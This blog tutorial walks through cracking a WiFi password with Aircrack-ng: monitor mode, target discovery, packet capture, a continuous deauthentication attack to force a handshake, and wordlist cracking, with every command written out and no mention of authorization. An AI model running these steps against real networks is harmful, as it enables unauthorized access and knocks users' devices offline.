---
author: "UmmIt"
title: "Cracking WIFI Password with Aircrack-ng"
date: 2024-07-06T22:06:14+0800
tags: ["Aircrack-ng", "high-school-article-rewrite", "Cyber-Security", "WiFi"]
---

# rewrite

I've revisited and cleaned up this guide from my high school days to make it more understandable.

## What is Aircrack-ng?

[Aircrack-ng](https://www.kali.org/tools/aircrack-ng/) is a toolset used to assess WiFi network security. It includes:

- **Monitoring**: Capturing WiFi data packets for analysis.
- **Attacking**: Performing actions like packet injection and creating fake access points.
- **Testing**: Checking WiFi card capabilities.
- **Cracking**: Breaking WEP and WPA PSK (WPA 1 and 2) encryption.

## Hardware Requirements

To use Aircrack-ng, you need a wireless card or USB adapter. Without one, you can't perform WiFi cracking operations.

## Checking Card Status

Ensure your wireless card is recognized:

```shell
root@kali:~# iwconfig
```
![iwconfig](./iwconfig.gif)

## Starting Monitor Mode

Enable monitor mode on your wireless interface (`wlan0` or similar):

```shell
root@kali:~# airmon-ng start wlan0
```
![airmon-ng start wlan0](./airmon-ng%20start%20wlan0.png)

## Finding Target WiFi Network

Identify the WiFi network (ESSID, BSSID, and channel number):

```shell
root@kali:~# airodump-ng wlan0mon
```
![airodump-ng wlan0mon](./airodump-ng%20wlan0mon.gif)

## Creating Capture File

Capture data from the target network:

```shell
airodump-ng -d [BSSID] -c[channel] -w [capture filename] wlan0mon
```
![Creating Cap file](./capfile.gif)
![Creating Cap file-2](./capfile-2.gif)
![file](./file.gif)

## Performing Deauthentication Attack

Disconnect a device from the network to capture the necessary handshake or PMKID:

```shell
aireplay-ng --deauth 0 -a [BSSID] wlan0mon
```
![Device deauth](./handshake.gif)

## Cracking the Password

Once you've captured the handshake or PMKID, use Aircrack-ng to crack the WiFi password:

```shell
aircrack-ng [capture filename] -w [password list file]
```

![Cracking password](./cracking.png)

## Closing Monitor Mode

Disable monitor mode after you're done:

```shell
root@kali:~# airmon-ng stop wlan0mon
```
![Stop Monitor Mode](./stop.png)
